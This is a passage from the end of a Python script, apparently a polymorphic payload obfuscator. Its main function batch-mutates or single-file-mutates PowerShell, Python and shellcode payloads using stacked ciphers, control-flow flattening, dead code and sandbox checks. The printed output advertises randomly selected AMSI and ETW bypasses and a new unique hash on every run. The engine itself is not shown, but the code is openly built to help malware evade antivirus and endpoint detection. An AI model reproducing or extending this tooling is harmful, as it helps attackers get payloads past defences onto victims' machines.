        d = args.dir or os.path.expanduser("~/.wizza/payloads")
        watch_mode(d, args.interval, args.rounds)
        return

    if args.lang == "all":
        d = args.dir or os.path.expanduser("~/.wizza/payloads")
        print(f"  [*] Batch mutating {d} (rounds={args.rounds})...")
        n = batch_mutate(d, rounds=args.rounds)
        print(f"  [+] Done — {n} file(s) mutated")
        return

    if not args.infile or not args.outfile:
        ap.error("--in and --out required for single-file mode")

    pe = PolyEngine(
        rounds      = args.rounds,
        flatten     = not args.no_flatten,
        dead_blocks = 4,
        sandbox     = not args.no_sandbox,
    )

    with open(args.infile) as f:
        source = f.read()

    h_before = sha256_file(args.infile)

    if args.lang == "ps1":
        out = pe.mutate_ps1(source)
    elif args.lang == "py":
        out = pe.mutate_py(source)
    elif args.lang == "shell":
        # Treat source as hex shellcode
        out = pe.mutate_shellcode_ps1(source.strip())
    else:
        out = pe.mutate_ps1(source)

    with open(args.outfile, "w") as f:
        f.write(out)

    h_after = sha256_file(args.outfile)

    print(f"  [+] Input:    {args.infile}  (sha256: {h_before})")
    print(f"  [+] Output:   {args.outfile} (sha256: {h_after})")
    print(f"  [+] Rounds:   {args.rounds} cipher layers ({'/'.join(CIPHER_NAMES[:args.rounds])} stacked)")
    print(f"  [+] Flatten:  {'yes' if not args.no_flatten else 'no'} (control-flow dispatch loop)")
    print(f"  [+] Sandbox:  {'yes' if not args.no_sandbox else 'no'} (uptime/hostname/process checks)")
    print(f"  [+] AMSI bypasses: 5 variants (random selection each run)")
    print(f"  [+] ETW bypasses:  2 variants (random selection each run)")
    print(f"  [*] Polymorphic — re-run for a new unique output")

if __name__ == "__main__":
    main()
